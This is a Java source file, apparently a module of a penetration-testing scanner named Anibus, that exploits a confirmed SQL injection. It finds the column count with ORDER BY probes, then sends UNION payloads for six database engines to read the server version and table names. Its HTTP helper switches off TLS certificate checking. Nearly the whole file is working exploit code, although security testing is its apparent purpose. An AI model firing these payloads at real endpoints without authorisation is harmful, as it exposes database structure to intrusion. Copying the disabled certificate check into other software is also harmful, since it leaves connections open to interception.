package it.r2u.anibus.service.analysis;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;

import javax.net.ssl.HttpsURLConnection;

/**
 * SQL Metadata Extractor — secondary phase after SQLInjectionAnalyzer confirms injection.
 *
 * Attempts READ-ONLY metadata extraction through UNION-based injection vectors.
 * Targets: MySQL, PostgreSQL, MSSQL, SQLite (detected from InjectionResult.getDetectedDatabase).
 * Does NOT attempt DML (INSERT / UPDATE / DELETE / DROP) operations.
 */
public class SqlMetadataExtractor {

    private static final int TIMEOUT = 10_000;
    /** Delimiter we look for in the reflected response. */
    private static final String DELIM = "ANIBUS~";

    // ── public result type ────────────────────────────────────────────────────

    public record MetadataResult(
            String dbType,
            String dbVersion,
            List<String> tables,
            int columnCount,
            String endpointUrl,
            List<String> rawFindings
    ) {}

    // ── DB-specific UNION payloads ─────────────────────────────────────────────
    // Each string has a %d placeholder for the column count determined by the probe.

    private static final Map<String, String[]> DB_VERSION_PAYLOADS = new LinkedHashMap<>();
    private static final Map<String, String[]> DB_TABLES_PAYLOADS  = new LinkedHashMap<>();

    static {
        // MySQL / MariaDB
        DB_VERSION_PAYLOADS.put("MySQL",
            new String[]{"' UNION SELECT concat('" + DELIM + "',version(),'" + DELIM + "')-- -",
                         "1 UNION SELECT concat('" + DELIM + "',version(),'" + DELIM + "')-- -"});
        DB_TABLES_PAYLOADS.put("MySQL",
            new String[]{"' UNION SELECT concat('" + DELIM + "',table_name,'" + DELIM + "') FROM information_schema.tables WHERE table_schema=database() LIMIT 20-- -",
                         "1 UNION SELECT concat('" + DELIM + "',table_name,'" + DELIM + "') FROM information_schema.tables WHERE table_schema=database() LIMIT 20-- -"});

        DB_VERSION_PAYLOADS.put("MariaDB",
            DB_VERSION_PAYLOADS.get("MySQL"));
        DB_TABLES_PAYLOADS.put("MariaDB",
            DB_TABLES_PAYLOADS.get("MySQL"));

        // PostgreSQL
        DB_VERSION_PAYLOADS.put("PostgreSQL",
            new String[]{"' UNION SELECT concat('" + DELIM + "',version(),'" + DELIM + "')-- -",
                         "1 UNION SELECT concat('" + DELIM + "',version(),'" + DELIM + "')-- -"});
        DB_TABLES_PAYLOADS.put("PostgreSQL",
            new String[]{"' UNION SELECT concat('" + DELIM + "',table_name,'" + DELIM + "') FROM information_schema.tables WHERE table_schema='public' LIMIT 20-- -",
                         "1 UNION SELECT concat('" + DELIM + "',table_name,'" + DELIM + "') FROM information_schema.tables WHERE table_schema='public' LIMIT 20-- -"});

        // Microsoft SQL Server
        DB_VERSION_PAYLOADS.put("Microsoft SQL Server",
            new String[]{"' UNION SELECT '" + DELIM + "'+@@version+'" + DELIM + "'--",
                         "1 UNION SELECT '" + DELIM + "'+@@version+'" + DELIM + "'--"});
        DB_TABLES_PAYLOADS.put("Microsoft SQL Server",
            new String[]{"' UNION SELECT TOP 20 '" + DELIM + "'+name+'" + DELIM + "' FROM sysobjects WHERE xtype='U'--",
                         "1 UNION SELECT TOP 20 '" + DELIM + "'+name+'" + DELIM + "' FROM sysobjects WHERE xtype='U'--"});

        // SQLite
        DB_VERSION_PAYLOADS.put("SQLite",
            new String[]{"' UNION SELECT '" + DELIM + "'||sqlite_version()||'" + DELIM + "'--",
                         "1 UNION SELECT '" + DELIM + "'||sqlite_version()||'" + DELIM + "'--"});
        DB_TABLES_PAYLOADS.put("SQLite",
            new String[]{"' UNION SELECT '" + DELIM + "'||name||'" + DELIM + "' FROM sqlite_master WHERE type='table' LIMIT 20--",
                         "1 UNION SELECT '" + DELIM + "'||name||'" + DELIM + "' FROM sqlite_master WHERE type='table' LIMIT 20--"});

        // Oracle
        DB_VERSION_PAYLOADS.put("Oracle",
            new String[]{"' UNION SELECT '" + DELIM + "'||banner||'" + DELIM + "' FROM v$version WHERE ROWNUM=1--",
                         "1 UNION SELECT '" + DELIM + "'||banner||'" + DELIM + "' FROM v$version WHERE ROWNUM=1--"});
        DB_TABLES_PAYLOADS.put("Oracle",
            new String[]{"' UNION SELECT '" + DELIM + "'||table_name||'" + DELIM + "' FROM user_tables WHERE ROWNUM<=20--",
                         "1 UNION SELECT '" + DELIM + "'||table_name||'" + DELIM + "' FROM user_tables WHERE ROWNUM<=20--"});
    }

    // ── Public API ────────────────────────────────────────────────────────────

    /**
     * Attempts metadata extraction against the vulnerable endpoint from an InjectionResult.
     *
     * @param vuln a confirmed vulnerable {@link SQLInjectionAnalyzer.InjectionResult}
     * @return populated {@link MetadataResult}; tables list may be empty if not reflective
     */
    public MetadataResult extract(SQLInjectionAnalyzer.InjectionResult vuln) {
        String dbType = nvl(vuln.getDetectedDatabase(), "MySQL"); // default guess
        String endpoint = vuln.getEndpoint();
        String method   = vuln.getMethod();
        List<String> findings = new ArrayList<>();

        // ── 1. Probe for column count (ORDER BY binary search) ──────────────
        int cols = probeColumnCount(endpoint, method);
        findings.add("Column count probe: " + (cols > 0 ? cols + " column(s)" : "indeterminate"));

        // ── 2. Extract DB version ──────────────────────────────────────────
        String version = extractVersion(endpoint, method, dbType);
        if (!version.isBlank()) findings.add("Version: " + version);

        // ── 3. Extract table names ─────────────────────────────────────────
        List<String> tables = extractTables(endpoint, method, dbType);
        if (!tables.isEmpty()) {
            findings.add("Tables found: " + tables.stream().collect(Collectors.joining(", ")));
        } else {
            findings.add("Tables: not extractable via UNION reflection (may be blind/time-based)");
        }

        return new MetadataResult(dbType, version, tables, cols, endpoint, findings);
    }

    public static String formatReport(MetadataResult r) {
        StringBuilder sb = new StringBuilder();
        sb.append("═══════════════════════════════════════════════════════════\n");
        sb.append("  SQL METADATA EXTRACTION\n");
        sb.append("  Endpoint : ").append(r.endpointUrl()).append("\n");
        sb.append("  DB Type  : ").append(r.dbType()).append("\n");
        if (!r.dbVersion().isBlank())
            sb.append("  Version  : ").append(r.dbVersion()).append("\n");
        sb.append("  Columns  : ").append(r.columnCount() > 0 ? r.columnCount() : "unknown").append("\n");
        sb.append("═══════════════════════════════════════════════════════════\n\n");

        if (!r.tables().isEmpty()) {
            sb.append("  Tables extracted (").append(r.tables().size()).append("):\n");
            for (String t : r.tables()) sb.append("    • ").append(t).append("\n");
        } else {
            sb.append("  Tables: (not extractable via UNION reflection)\n");
        }

        if (!r.rawFindings().isEmpty()) {
            sb.append("\n  Findings:\n");
            for (String f : r.rawFindings()) sb.append("    ").append(f).append("\n");
        }
        return sb.toString();
    }

    // ── Extraction helpers ────────────────────────────────────────────────────

    /** ORDER BY binary search to find number of columns. Returns 0 if not determinable. */
    private int probeColumnCount(String endpoint, String method) {
        // Try ORDER BY 1..20 — when error appears, previous was the count
        int last = 0;
        for (int i = 1; i <= 20; i++) {
            String payload = "' ORDER BY " + i + "-- -";
            try {
                HttpResponse r = send(endpoint, method, payload);
                if (r.statusCode() >= 500) break; // error threshold crossed
                last = i;
            } catch (IOException ignored) {
                break;
            }
        }
        return last;
    }

    private String extractVersion(String endpoint, String method, String dbType) {
        String[] payloads = DB_VERSION_PAYLOADS.get(dbType);
        if (payloads == null) return "";
        for (String p : payloads) {
            try {
                HttpResponse r = send(endpoint, method, p);
                String v = extractDelimited(r.body());
                if (!v.isBlank()) return v;
            } catch (IOException ignored) {}
        }
        return "";
    }

    private List<String> extractTables(String endpoint, String method, String dbType) {
        String[] payloads = DB_TABLES_PAYLOADS.get(dbType);
        if (payloads == null) return List.of();
        for (String p : payloads) {
            try {
                HttpResponse r = send(endpoint, method, p);
                List<String> tables = extractAllDelimited(r.body());
                if (!tables.isEmpty()) return tables;
            } catch (IOException ignored) {}
        }
        return List.of();
    }

    /** Extracts values between DELIM markers in response. */
    private static String extractDelimited(String body) {
        Pattern p = Pattern.compile(Pattern.quote(DELIM) + "(.*?)" + Pattern.quote(DELIM));
        Matcher m = p.matcher(body);
        return m.find() ? m.group(1).strip() : "";
    }

    private static List<String> extractAllDelimited(String body) {
        Pattern p = Pattern.compile(Pattern.quote(DELIM) + "(.*?)" + Pattern.quote(DELIM));
        Matcher m = p.matcher(body);
        List<String> results = new ArrayList<>();
        while (m.find()) {
            String v = m.group(1).strip();
            if (!v.isBlank()) results.add(v);
        }
        return results;
    }

    // ── HTTP helper ───────────────────────────────────────────────────────────

    private record HttpResponse(int statusCode, String body) {}

    private HttpResponse send(String endpoint, String method, String payload) throws IOException {
        // Append payload as a query param or POST body
        String targetUrl;
        String postBody = null;
        if ("POST".equalsIgnoreCase(method)) {
            targetUrl = endpoint;
            postBody = "q=" + encode(payload) + "&id=" + encode(payload);
        } else {
            // GET — append as query param, replacing existing '?' separator
            String sep = endpoint.contains("?") ? "&" : "?";
            targetUrl = endpoint + sep + "q=" + encode(payload);
        }

        HttpURLConnection con = openConnection(targetUrl);
        if (con == null) {
            throw new IOException("Connection must not be null");
        }

        if (con instanceof HttpsURLConnection https) {
            it.r2u.anibus.util.InsecureSsl.apply(https);
        }

        con.setConnectTimeout(TIMEOUT);
        con.setReadTimeout(TIMEOUT);
        con.setRequestMethod("POST".equalsIgnoreCase(method) ? "POST" : "GET");
        con.setRequestProperty("User-Agent", "Mozilla/5.0");
        con.setInstanceFollowRedirects(true);

        if (postBody != null) {
            con.setDoOutput(true);
            con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            try (var out = con.getOutputStream()) {
                out.write(postBody.getBytes(StandardCharsets.UTF_8));
            }
        }

        int code;
        try { code = con.getResponseCode(); } catch (IOException e) { code = 0; }

        var rawStream = code < 400 ? con.getInputStream() : con.getErrorStream();
        if (rawStream == null) return new HttpResponse(code, "");
        try (BufferedReader br = new BufferedReader(new InputStreamReader(
                rawStream, StandardCharsets.UTF_8))) {
            String body = br.lines().collect(Collectors.joining("\n"));
            return new HttpResponse(code, body);
        }
    }

    private static String encode(String s) {
        return java.net.URLEncoder.encode(s, StandardCharsets.UTF_8);
    }

    private static HttpURLConnection openConnection(String targetUrl) throws IOException {
        try {
            return (HttpURLConnection) URI.create(targetUrl).toURL().openConnection();
        } catch (IllegalArgumentException e) {
            throw new IOException("Invalid URL: " + targetUrl, e);
        }
    }

    private static String nvl(String s, String def) { return (s == null || s.isBlank()) ? def : s; }
}
